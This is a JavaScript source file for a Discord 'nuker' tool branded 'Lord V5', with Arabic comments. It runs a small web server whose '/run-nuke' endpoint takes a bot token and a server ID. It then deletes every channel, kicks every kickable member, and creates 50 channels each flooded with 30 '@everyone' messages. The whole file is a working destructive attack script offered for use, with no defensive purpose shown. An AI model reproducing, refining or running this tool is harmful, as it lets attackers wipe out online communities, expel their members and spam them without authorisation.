const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
app.use(express.static('.'));

app.post('/run-nuke', async (req, res) => {
    const { token, guildId, roomName, message, delChannels, kickMembers } = req.body;

    // Intents كاملة وشاملة
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    client.on('ready', async () => {
        console.log(`[LOG] تم الدخول بواسطة: ${client.user.tag}`);
        
        try {
            const guild = await client.guilds.fetch(guildId);
            if (!guild) return console.log("[ERROR] السيرفر غير موجود!");

            console.log(`[LOG] بدء الهجوم على سيرفر: ${guild.name}`);

            // تنفيذ العمليات دفعة واحدة (Async)
            if (delChannels) {
                guild.channels.cache.forEach(ch => ch.delete().catch(e => console.log(`خطأ حذف: ${e.message}`)));
            }

            if (kickMembers) {
                guild.members.cache.forEach(m => {
                    if (m.kickable) m.kick("Lord V5").catch(e => console.log(`خطأ طرد: ${e.message}`));
                });
            }

            // إنشاء رومات وسبام
            for (let i = 0; i < 50; i++) {
                guild.channels.create({
                    name: roomName || "nuked-by-lord",
                    type: ChannelType.GuildText
                }).then(channel => {
                    for (let j = 0; j < 30; j++) {
                        channel.send(message || "@everyone V5 HERE").catch(() => {});
                    }
                }).catch(e => console.log(`خطأ إنشاء: ${e.message}`));
            }

        } catch (err) {
            console.error("[ERROR] فشل الوصول للسيرفر:", err.message);
        }
    });

    client.login(token).catch(err => {
        console.error("[ERROR] التوكن مرفوض:", err.message);
    });

    res.json({ status: "started" });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("--- LORD V5 IS ACTIVE ---");
});
